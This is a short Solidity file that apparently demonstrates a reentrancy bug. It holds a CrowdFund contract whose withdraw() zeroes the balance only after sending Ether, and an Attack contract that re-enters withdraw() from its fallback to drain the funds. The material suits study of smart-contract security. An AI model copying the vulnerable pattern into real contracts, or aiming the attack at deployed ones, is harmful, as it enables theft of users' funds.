// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

contract CrowdFund {
    mapping(address => uint) pledges;

    // Pledge money to crowdfund by sending a transaction
    receive() external payable {
        pledges[msg.sender] += msg.value;
    }

    function withdraw() external {
        (bool success, ) = msg.sender.call{ 
            value: pledges[msg.sender]
        }("");
        if (success) { pledges[msg.sender] = 0; }
    }
}

contract Attack {
    CrowdFund public cf;
    constructor (address payable _cfAddress) { 
        cf = CrowdFund(_cfAddress); 
    }

    function attack() public payable {
        (bool success, ) = address(cf).call{
            value: msg.value
        }("");
        if (success) { cf.withdraw(); }
    }

    receive() external payable {
        cf.withdraw();
    }
}